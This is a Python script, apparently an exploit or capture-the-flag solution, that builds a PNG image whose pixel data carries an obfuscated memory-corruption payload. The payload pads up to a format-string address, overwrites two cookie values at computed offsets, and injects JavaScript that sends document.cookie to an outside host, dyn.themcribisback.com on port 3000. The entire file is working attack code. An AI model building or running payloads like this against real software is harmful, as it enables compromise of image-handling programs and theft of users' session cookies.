from PIL import Image

fmt_str_addr = 5242966
out_addr = 2242864
my_cookie1 = 0x42042042
my_cookie2 = 0xdeadbeef
my_cookie1_addr = 2242832 + 3000032
my_cookie2_addr = my_cookie1_addr + 4

img = Image.new('RGBA', (1000, 1000), (0, 0, 0, 0))

def write_u32(payload, offset, value):
    payload[offset] = value & 0xFF
    payload[offset + 1] = (value >> 8) & 0xFF
    payload[offset + 2] = (value >> 16) & 0xFF
    payload[offset + 3] = (value >> 24) & 0xFF

payload = list(b'a' * (fmt_str_addr - out_addr) + b'fetch("http://dyn.themcribisback.com:3000/" + document.cookie)\0')

write_u32(payload, my_cookie1_addr - out_addr, my_cookie1)
write_u32(payload, my_cookie2_addr - out_addr, my_cookie2)

for i in range(len(payload)):
    if i % 4 != 3:
        payload[i] = payload[i] ^ 0xff

    pixel_idx = i // 4
    component_idx = i % 4
    
    orig_pixel = img.getpixel((pixel_idx % 1000, pixel_idx // 1000))
    new_pixel = list(orig_pixel)
    new_pixel[component_idx] = payload[i]
    img.putpixel((pixel_idx % 1000, pixel_idx // 1000), tuple(new_pixel))

# write pixel to png file
img.save('png_gen.png', compress_level=9)